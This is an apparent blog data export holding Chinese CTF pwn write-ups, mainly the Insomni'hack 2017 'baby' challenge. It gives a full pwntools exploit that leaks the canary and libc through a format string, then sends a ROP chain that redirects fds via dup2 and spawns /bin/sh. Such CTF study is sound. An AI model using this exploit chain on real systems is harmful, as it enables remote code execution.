class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali ~/c/<span class=\"number\">2</span>/p/artifact# seccomp-tools dump ./artifact </div><div class=\"line\"> line  CODE  JT   JF      K</div><div class=\"line\">=================================</div><div class=\"line\"> <span class=\"number\">0000</span>: <span class=\"number\">0x20 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000004</span>  <span class=\"keyword\">A</span> = arch</div><div class=\"line\"> <span class=\"number\">0001</span>: <span class=\"number\">0x15 0x00</span> <span class=\"number\">0</span>x10 <span class=\"number\">0</span>xc000003e  if (<span class=\"keyword\">A</span> != ARCH_X86_64) goto <span class=\"number\">0018</span></div><div class=\"line\"> <span class=\"number\">0002</span>: <span class=\"number\">0x20 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000020</span>  <span class=\"keyword\">A</span> = args[<span class=\"number\">2</span>]</div><div class=\"line\"> <span class=\"number\">0003</span>: <span class=\"number\">0x07 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000000</span>  X = <span class=\"keyword\">A</span></div><div class=\"line\"> <span class=\"number\">0004</span>: <span class=\"number\">0x20 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000000</span>  <span class=\"keyword\">A</span> = sys_number</div><div class=\"line\"> <span class=\"number\">0005</span>: <span class=\"number\">0</span>x15 <span class=\"number\">0</span>x0d <span class=\"number\">0</span>x00 <span class=\"number\">0x00000000</span>  if (<span class=\"keyword\">A</span> == read) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0006</span>: <span class=\"number\">0</span>x15 <span class=\"number\">0</span>x0c <span class=\"number\">0</span>x00 <span class=\"number\">0x00000001</span>  if (<span class=\"keyword\">A</span> == write) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0007</span>: <span class=\"number\">0</span>x15 <span class=\"number\">0</span>x0b <span class=\"number\">0</span>x00 <span class=\"number\">0x00000005</span>  if (<span class=\"keyword\">A</span> == fstat) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0008</span>: <span class=\"number\">0</span>x15 <span class=\"number\">0</span>x0a <span class=\"number\">0</span>x00 <span class=\"number\">0x00000008</span>  if (<span class=\"keyword\">A</span> == lseek) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0009</span>: <span class=\"number\">0x15 0x01</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000009</span>  if (<span class=\"keyword\">A</span> == mmap) goto <span class=\"number\">0011</span></div><div class=\"line\"> <span class=\"number\">0010</span>: <span class=\"number\">0x15 0x00</span> <span class=\"number\">0</span>x03 <span class=\"number\">0</span>x0000000a  if (<span class=\"keyword\">A</span> != mprotect) goto <span class=\"number\">0014</span></div><div class=\"line\"> <span class=\"number\">0011</span>: <span class=\"number\">0x87 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000000</span>  <span class=\"keyword\">A</span> = X</div><div class=\"line\"> <span class=\"number\">0012</span>: <span class=\"number\">0x54 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000001</span>  <span class=\"keyword\">A</span> &amp;= <span class=\"number\">0</span>x1</div><div class=\"line\"> <span class=\"number\">0013</span>: <span class=\"number\">0x15 0x04</span> <span class=\"number\">0</span>x05 <span class=\"number\">0x00000001</span>  if (<span class=\"keyword\">A</span> == <span class=\"number\">1</span>) goto <span class=\"number\">0018</span> else goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0014</span>: <span class=\"number\">0</span>x1d <span class=\"number\">0x04 0x00</span> <span class=\"number\">0</span>x0000000b  if (<span class=\"keyword\">A</span> == X) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0015</span>: <span class=\"number\">0x15 0x03</span> <span class=\"number\">0</span>x00 <span class=\"number\">0</span>x0000000c  if (<span class=\"keyword\">A</span> == brk) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0016</span>: <span class=\"number\">0x15 0x02</span> <span class=\"number\">0</span>x00 <span class=\"number\">0</span>x0000003c  if (<span class=\"keyword\">A</span> == exit) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0017</span>: <span class=\"number\">0x15 0x01</span> <span class=\"number\">0</span>x00 <span class=\"number\">0</span>x<span class=\"number\">000000e7</span>  if (<span class=\"keyword\">A</span> == exit_group) goto <span class=\"number\">0019</span></div><div class=\"line\"> <span class=\"number\">0018</span>: <span class=\"number\">0x06 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0x00000000</span>  return KILL</div><div class=\"line\"> <span class=\"number\">0019</span>: <span class=\"number\">0x06 0x00</span> <span class=\"number\">0</span>x00 <span class=\"number\">0</span>x7fff0000  return ALLOW</div></pre></td></tr></table></figure>\n<p>可以看出允许了<code>read</code>，<code>write</code>，<code>fstat</code>这几个函数功能，如果第三个参数是奇数则<code>kill</code>，所以<code>mmap</code>和<code>mprotect</code>不能申请执行段。同时如果<code>arg[2]</code>和<code>syscallnum</code>相同则可以执行，所以<code>open</code>是可以的。最后用<code>ORW</code>得到flag即可。</p>\n"},{"title":"2017Insomni’hack teaser Pwn baby writeup","date":"2017-01-31T16:50:36.000Z","_content":"\n2017的第一场比赛，看了看，只会做一道forencis，pwn的baby还是很简单的，然而由于对canary的认识不足，导致如此简单的一道题目也不会。后面的pwn就没看了。\n\n## baby 50\n\n有三个漏洞选项，stack overflow、fsb、heap overflow，checksec看下\n\n```\npwndbg> checksec \nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE\nFull RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/ubuntu/ctf-problem/2017ins/pwn/baby/baby\n```\n\nWTF???居然保护全开了，这是最坑爹的了，当时看到canary我就不知道栈溢出该怎么用了，后来才知道**canary是全局变量，每个进程中栈的canary是一样的，在进程运行时，先生成一个16byte的canary，然后随机从中选8byte填充，并且在后以'\\00'结尾截断，不泄露栈地址**\n\ndprintf函数原型`int dprintf(int fd, char* format[, ...])`，和printf很像，我理解就是加了一个重定向的printf，一样有fsb漏洞。\n\n这题的思路，fsb泄露canary，libc，构造rop chain，stack overflow执行system('/bin/sh')\n\n现在的问题时，我们的canary在栈上的第几个参数？libc应该泄露哪个参数。\n\n看了wp，发现分别时%138$llx、%158$llx。似乎大家都知道这个事。。。\n\n然后libc泄露的是`__libc_start_main+0xf0`的地址，所以得到的地址减`0xf0-__libc_start_main`\n\n64位的参数传递rdi, rsi, rdx, rcx, r8, r9。注意下`dup2()`这个函数，这个函数用来重定向，原型`int dup2(int odlfd, int newfd)`。\n\n> dup2和dup函数一样，只是返回的文件描述符可以通过第二个参数”可用的文件描述符“指定。如果“可用的文件描述符“是打开状态，则会被关闭；如果”现存的文件描述符“和”可用的文件描述符“一样，则不会关闭.\n\n但是我这里还是有个地方不明白，在这里dup2()的oldfd参数为什么是4和0、1、2；0、1、2分别表示标准输入、标准输出、标准错误输出，然后每打开一个新文件返回没有被使用的fd的最小值。这里打开了标准输入输出，至于为什么是4我还没搞懂= =\n\nexp:\n\n```\nfrom pwn import *\n\n# rdi, rsi, rdx, rcx, r8, r9\n# int dup2(int odlfd, int newfd)\n\ncontext.log_level = 'debug'\n\ndef dofmt(payload):\n\tp.recvuntil('Your choice > ')\n\tp.sendline('2')\n\tp.recvuntil('Your format > ')\n\tp.sendline(payload)\n\treturn p.recvline()\n\ndef dostack():\n    p.send('\\n')\n    p.recvuntil('Your choice > ')\n    p.sendline('1')\n    p.recvuntil('send ? ')\n\ndef leak_libc():\n    payload = ''\n    payload += '%138$llx_%158$llx'\n    array = dofmt(payload).split('_')\n    return int(array[0], 16), int(array[1], 16)\n\ndef bof_stack():\n\tdostack()\n\t# buf = 0x410 = 1040\n\tpayload = 'a' * 0x408\n\tpayload += p64(canary) + p64(1) + p64(pdr) + p64(4) + p64(psr) + p64(0) + p64(dup2)\n\tpayload += p64(pdr) + p64(4) + p64(psr) + p64(1) + p64(dup2)\n\tpayload += p64(pdr) + p64(4) + p64(psr) + p64(2) + p64(dup2)\n\tpayload += p64(pdr) + p64(binsh) + p64(system)\n\tpayload_length = len(payload) + 1\n\tp.sendline(str(payload_length))\n\tp.sendline(payload)\n\tlog.info(p.recvline())\n\tp.interactive()\n\nif __name__ == '__main__':\n    pdr = 0x21102 # pop rdi; ret;\n    psr = 0x202e8 # pop rsi; ret;\n\n    p = remote('127.0.0.1', 1337)\n    libc = ELF('libc.so')\n    canary, libc_addr = leak_libc()\n    libc_base = libc_addr - 0x20830\n    libc.address = libc_base\n    pdr = libc_base + pdr\n    psr = libc_base + psr\n    system = libc.symbols['system']\n    dup2 = libc.symbols['dup2']\n    binsh = libc.search('/bin/sh').next()\n    bof_stack()\n\n```\n","source":"_posts/2017Ins.md","raw":"---\ntitle: 2017Insomni’hack teaser Pwn baby writeup\ntags: [PWN, writeup]\ncategories: []\ndate: 2017-02-01 00:50:36\n---\n\n2017的第一场比赛，看了看，只会做一道forencis，pwn的baby还是很简单的，然而由于对canary的认识不足，导致如此简单的一道题目也不会。后面的pwn就没看了。\n\n## baby 50\n\n有三个漏洞选项，stack overflow、fsb、heap overflow，checksec看下\n\n```\npwndbg> checksec \nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE\nFull RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/ubuntu/ctf-problem/2017ins/pwn/baby/baby\n```\n\nWTF???居然保护全开了，这是最坑爹的了，当时看到canary我就不知道栈溢出该怎么用了，后来才知道**canary是全局变量，每个进程中栈的canary是一样的，在进程运行时，先生成一个16byte的canary，然后随机从中选8byte填充，并且在后以'\\00'结尾截断，不泄露栈地址**\n\ndprintf函数原型`int dprintf(int fd, char* format[, ...])`，和printf很像，我理解就是加了一个重定向的printf，一样有fsb漏洞。\n\n这题的思路，fsb泄露canary，libc，构造rop chain，stack overflow执行system('/bin/sh')\n\n现在的问题时，我们的canary在栈上的第几个参数？libc应该泄露哪个参数。\n\n看了wp，发现分别时%138$llx、%158$llx。似乎大家都知道这个事。。。\n\n然后libc泄露的是`__libc_start_main+0xf0`的地址，所以得到的地址减`0xf0-__libc_start_main`\n\n64位的参数传递rdi, rsi, rdx, rcx, r8, r9。注意下`dup2()`这个函数，这个函数用来重定向，原型`int dup2(int odlfd, int newfd)`。\n\n> dup2和dup函数一样，只是返回的文件描述符可以通过第二个参数”可用的文件描述符“指定。如果“可用的文件描述符“是打开状态，则会被关闭；如果”现存的文件描述符“和”可用的文件描述符“一样，则不会关闭.\n\n但是我这里还是有个地方不明白，在这里dup2()的oldfd参数为什么是4和0、1、2；0、1、2分别表示标准输入、标准输出、标准错误输出，然后每打开一个新文件返回没有被使用的fd的最小值。这里打开了标准输入输出，至于为什么是4我还没搞懂= =\n\nexp:\n\n```\nfrom pwn import *\n\n# rdi, rsi, rdx, rcx, r8, r9\n# int dup2(int odlfd, int newfd)\n\ncontext.log_level = 'debug'\n\ndef dofmt(payload):\n\tp.recvuntil('Your choice > ')\n\tp.sendline('2')\n\tp.recvuntil('Your format > ')\n\tp.sendline(payload)\n\treturn p.recvline()\n\ndef dostack():\n    p.send('\\n')\n    p.recvuntil('Your choice > ')\n    p.sendline('1')\n    p.recvuntil('send ? ')\n\ndef leak_libc():\n    payload = ''\n    payload += '%138$llx_%158$llx'\n    array = dofmt(payload).split('_')\n    return int(array[0], 16), int(array[1], 16)\n\ndef bof_stack():\n\tdostack()\n\t# buf = 0x410 = 1040\n\tpayload = 'a' * 0x408\n\tpayload += p64(canary) + p64(1) + p64(pdr) + p64(4) + p64(psr) + p64(0) + p64(dup2)\n\tpayload += p64(pdr) + p64(4) + p64(psr) + p64(1) + p64(dup2)\n\tpayload += p64(pdr) + p64(4) + p64(psr) + p64(2) + p64(dup2)\n\tpayload += p64(pdr) + p64(binsh) + p64(system)\n\tpayload_length = len(payload) + 1\n\tp.sendline(str(payload_length))\n\tp.sendline(payload)\n\tlog.info(p.recvline())\n\tp.interactive()\n\nif __name__ == '__main__':\n    pdr = 0x21102 # pop rdi; ret;\n    psr = 0x202e8 # pop rsi; ret;\n\n    p = remote('127.0.0.1', 1337)\n    libc = ELF('libc.so')\n    canary, libc_addr = leak_libc()\n    libc_base = libc_addr - 0x20830\n    libc.address = libc_base\n    pdr = libc_base + pdr\n    psr = libc_base + psr\n    system = libc.symbols['system']\n    dup2 = libc.symbols['dup2']\n    binsh = libc.search('/bin/sh').next()\n    bof_stack()\n\n```\n","slug":"2017Ins","published":1,"updated":"2017-02-02T18:35:33.995Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jxf000bhv18rrf07lpw","content":"<p>2017的第一场比赛，看了看，只会做一道forencis，pwn的baby还是很简单的，然而由于对canary的认识不足，导致如此简单的一道题目也不会。后面的pwn就没看了。</p>\n<h2 id=\"baby-50\"><a href=\"#baby-50\" class=\"headerlink\" title=\"baby 50\"></a>baby 50</h2><p>有三个漏洞选项，stack overflow、fsb、heap overflow，checksec看下</p>\n<figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; checksec </div><div class=\"line\">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      <span class=\"keyword\">FILE</span></div><div class=\"line\">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   <span class=\"regexp\">/home/u</span>buntu<span class=\"regexp\">/ctf-problem/</span><span class=\"number\">2017</span>ins<span class=\"regexp\">/pwn/</span>baby<span class=\"regexp\">/baby</span></div></pre></td></tr></table></figure>\n<p>WTF???居然保护全开了，这是最坑爹的了，当时看到canary我就不知道栈溢出该怎么用了，后来才知道<strong>canary是全局变量，每个进程中栈的canary是一样的，在进程运行时，先生成一个16byte的canary，然后随机从中选8byte填充，并且在后以’\\00’结尾截断，不泄露栈地址</strong></p>\n<p>dprintf函数原型<code>int dprintf(int fd, char* format[, ...])</code>，和printf很像，我理解就是加了一个重定向的printf，一样有fsb漏洞。</p>\n<p>这题的思路，fsb泄露canary，libc，构造rop chain，stack overflow执行system(‘/bin/sh’)</p>\n<p>现在的问题时，我们的canary在栈上的第几个参数？libc应该泄露哪个参数。</p>\n<p>看了wp，发现分别时%138$llx、%158$llx。似乎大家都知道这个事。。。</p>\n<p>然后libc泄露的是<code>__libc_start_main+0xf0</code>的地址，所以得到的地址减<code>0xf0-__libc_start_main</code></p>\n<p>64位的参数传递rdi, rsi, rdx, rcx, r8, r9。注意下<code>dup2()</code>这个函数，这个函数用来重定向，原型<code>int dup2(int odlfd, int newfd)</code>。</p>\n<blockquote>\n<p>dup2和dup函数一样，只是返回的文件描述符可以通过第二个参数”可用的文件描述符“指定。如果“可用的文件描述符“是打开状态，则会被关闭；如果”现存的文件描述符“和”可用的文件描述符“一样，则不会关闭.</p>\n</blockquote>\n<p>但是我这里还是有个地方不明白，在这里dup2()的oldfd参数为什么是4和0、1、2；0、1、2分别表示标准输入、标准输出、标准错误输出，然后每打开一个新文件返回没有被使用的fd的最小值。这里打开了标准输入输出，至于为什么是4我还没搞懂= =</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># rdi, rsi, rdx, rcx, r8, r9</span></div><div class=\"line\"><span class=\"comment\"># int dup2(int odlfd, int newfd)</span></div><div class=\"line\"></div><div class=\"line\">context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dofmt</span><span class=\"params\">(payload)</span>:</span></div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Your choice &gt; '</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Your format &gt; '</span>)</div><div class=\"line\">\tp.sendline(payload)</div><div class=\"line\">\t<span class=\"keyword\">return</span> p.recvline()</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dostack</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.send(<span class=\"string\">'\\n'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Your choice &gt; '</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'send ? '</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak_libc</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    payload = <span class=\"string\">''</span></div><div class=\"line\">    payload += <span class=\"string\">'%138$llx_%158$llx'</span></div><div class=\"line\">    array = dofmt(payload).split(<span class=\"string\">'_'</span>)</div><div class=\"line\">    <span class=\"keyword\">return</span> int(array[<span class=\"number\">0</span>], <span class=\"number\">16</span>), int(array[<span class=\"number\">1</span>], <span class=\"number\">16</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">bof_stack</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\tdostack()</div><div class=\"line\">\t<span class=\"comment\"># buf = 0x410 = 1040</span></div><div class=\"line\">\tpayload = <span class=\"string\">'a'</span> * <span class=\"number\">0x408</span></div><div class=\"line\">\tpayload += p64(canary) + p64(<span class=\"number\">1</span>) + p64(pdr) + p64(<span class=\"number\">4</span>) + p64(psr) + p64(<span class=\"number\">0</span>) + p64(dup2)</div><div class=\"line\">\tpayload += p64(pdr) + p64(<span class=\"number\">4</span>) + p64(psr) + p64(<span class=\"number\">1</span>) + p64(dup2)</div><div class=\"line\">\tpayload += p64(pdr) + p64(<span class=\"number\">4</span>) + p64(psr) + p64(<span class=\"number\">2</span>) + p64(dup2)</div><div class=\"line\">\tpayload += p64(pdr) + p64(binsh) + p64(system)</div><div class=\"line\">\tpayload_length = len(payload) + <span class=\"number\">1</span></div><div class=\"line\">\tp.sendline(str(payload_length))</div><div class=\"line\">\tp.sendline(payload)</div><div class=\"line\">\tlog.info(p.recvline())</div><div class=\"line\">\tp.interactive()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pdr = <span class=\"number\">0x21102</span> <span class=\"comment\"># pop rdi; ret;</span></div><div class=\"line\">    psr = <span class=\"number\">0x202e8</span> <span class=\"comment\"># pop rsi; ret;</span></div><div class=\"line\"></div><div class=\"line\">    p = remote(<span class=\"string\">'127.0.0.1'</span>, <span class=\"number\">1337</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'libc.so'</span>)</div><div class=\"line\">    canary, libc_addr = leak_libc()</div><div class=\"line\">    libc_base = libc_addr - <span class=\"number\">0x20830</span></div><div class=\"line\">    libc.address = libc_base</div><div class=\"line\">    pdr = libc_base + pdr</div><div class=\"line\">    psr = libc_base + psr</div><div class=\"line\">    system = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">    dup2 = libc.symbols[<span class=\"string\">'dup2'</span>]</div><div class=\"line\">    binsh = libc.search(<span class=\"string\">'/bin/sh'</span>).next()</div><div class=\"line\">    bof_stack()</div></pre></td></tr></table></figure>\n","excerpt":"","more":"<p>2017的第一场比赛，看了看，只会做一道forencis，pwn的baby还是很简单的，然而由于对canary的认识不足，导致如此简单的一道题目也不会。后面的pwn就没看了。</p>\n<h2 id=\"baby-50\"><a href=\"#baby-50\" class=\"headerlink\" title=\"baby 50\"></a>baby 50</h2><p>有三个漏洞选项，stack overflow、fsb、heap overflow，checksec看下</p>\n<figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; checksec </div><div class=\"line\">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      <span class=\"keyword\">FILE</span></div><div class=\"line\">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   <span class=\"regexp\">/home/u</span>buntu<span class=\"regexp\">/ctf-problem/</span><span class=\"number\">2017</span>ins<span class=\"regexp\">/pwn/</span>baby<span class=\"regexp\">/baby</span></div></pre></td></tr></table></figure>\n<p>WTF???居然保护全开了，这是最坑爹的了，当时看到canary我就不知道栈溢出该怎么用了，后来才知道<strong>canary是全局变量，每个进程中栈的canary是一样的，在进程运行时，先生成一个16byte的canary，然后随机从中选8byte填充，并且在后以’\\00’结尾截断，不泄露栈地址</strong></p>\n<p>dprintf函数原型<code>int dprintf(int fd, char* format[, ...])</code>，和printf很像，我理解就是加了一个重定向的printf，一样有fsb漏洞。</p>\n<p>这题的思路，fsb泄露canary，libc，构造rop chain，stack overflow执行system(‘/bin/sh’)</p>\n<p>现在的问题时，我们的canary在栈上的第几个参数？libc应该泄露哪个参数。</p>\n<p>看了wp，发现分别时%138$llx、%158$llx。似乎大家都知道这个事。。。</p>\n<p>然后libc泄露的是<code>__libc_start_main+0xf0</code>的地址，所以得到的地址减<code>0xf0-__libc_start_main</code></p>\n<p>64位的参数传递rdi, rsi, rdx, rcx, r8, r9。注意下<code>dup2()</code>这个函数，这个函数用来重定向，原型<code>int dup2(int odlfd, int newfd)</code>。</p>\n<blockquote>\n<p>dup2和dup函数一样，只是返回的文件描述符可以通过第二个参数”可用的文件描述符“指定。如果“可用的文件描述符“是打开状态，则会被关闭；如果”现存的文件描述符“和”可用的文件描述符“一样，则不会关闭.</p>\n</blockquote>\n<p>但是我这里还是有个地方不明白，在这里dup2()的oldfd参数为什么是4和0、1、2；0、1、2分别表示标准输入、标准输出、标准错误输出，然后每打开一个新文件返回没有被使用的fd的最小值。这里打开了标准输入输出，至于为什么是4我还没搞懂= =</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># rdi, rsi, rdx, rcx, r8, r9</span></div><div class=\"line\"><span class=\"comment\"># int dup2(int odlfd, int newfd)</span></div><div class=\"line\"></div><div class=\"line\">context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dofmt</span><span class=\"params\">(payload)</span>:</span></div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Your choice &gt; '</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Your format &gt; '</span>)</div><div class=\"line\">\tp.sendline(payload)</div><div class=\"line\">\t<span class=\"keyword\">return</span> p.recvline()</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dostack</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.send(<span class=\"string\">'\\n'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Your choice &gt; '</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'send ? '</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak_libc</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    payload = <span class=\"string\">''</span></div><div class=\"line\">    payload += <span class=\"string\">'%138$llx_%158$llx'</span></div><div class=\"line\">    array = dofmt(payload).split(<span class=\"string\">'_'</span>)</div><div class=\"line\">    <span class=\"keyword\">return</span> int(array[<span class=\"number\">0</span>], <span class=\"number\">16</span>), int(array[<span class=\"number\">1</span>], <span class=\"number\">16</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">bof_stack</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\tdostack()</div><div class=\"line\">\t<span class=\"comment\"># buf = 0x410 = 1040</span></div><div class=\"line\">\tpayload = <span class=\"string\">'a'</span> * <span class=\"number\">0x408</span></div><div class=\"line\">\tpayload += p64(canary) + p64(<span class=\"number\">1</span>) + p64(pdr) + p64(<span class=\"number\">4</span>) + p64(psr) + p64(<span class=\"number\">0</span>) + p64(dup2)</div><div class=\"line\">\tpayload += p64(pdr) + p64(<span class=\"number\">4</span>) + p64(psr) + p64(<span class=\"number\">1</span>) + p64(dup2)</div><div class=\"line\">\tpayload += p64(pdr) + p64(<span class=\"number\">4</span>) + p64(psr) + p64(<span class=\"number\">2</span>) + p64(dup2)</div><div class=\"line\">\tpayload += p64(pdr) + p64(binsh) + p64(system)</div><div class=\"line\">\tpayload_length = len(payload) + <span class=\"number\">1</span></div><div class=\"line\">\tp.sendline(str(payload_length))</div><div class=\"line\">\tp.sendline(payload)</div><div class=\"line\">\tlog.info(p.recvline())</div><div class=\"line\">\tp.interactive()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pdr = <span class=\"number\">0x21102</span> <span class=\"comment\"># pop rdi; ret;</span></div><div class=\"line\">    psr = <span class=\"number\">0x202e8</span> <span class=\"comment\"># pop rsi; ret;</span></div><div class=\"line\"></div><div class=\"line\">    p = remote(<span class=\"string\">'127.0.0.1'</span>, <span class=\"number\">1337</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'libc.so'</span>)</div><div class=\"line\">    canary, libc_addr = leak_libc()</div><div class=\"line\">    libc_base = libc_addr - <span class=\"number\">0x20830</span></div><div class=\"line\">    libc.address = libc_base</div><div class=\"line\">    pdr = libc_base + pdr</div><div class=\"line\">    psr = libc_base + psr</div><div class=\"line\">    system = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">    dup2 = libc.symbols[<span class=\"string\">'dup2'</span>]</div><div class=\"line\">    binsh = libc.search(<span class=\"string\">'/bin/sh'</span>).next()</div><div class=\"line\">    bof_stack()</div></pre></td></tr></table></figure>\n"},{"title":"2017NJCTF PWN","date":"2017-03-14T14:04:51.000Z","_content":"\n## messager\n\n`fork`，出来的进程基本上和原进程完全一样，包括`canary`和`ebp`。爆破`canary`，得到值后跳转到`0x400BC6`。因为程序已经将`flag`加载到内存中了，这里的代码将内存中的`flag`发过来。\n\n**说几个因为太菜的坑吧。。**\n\n1. 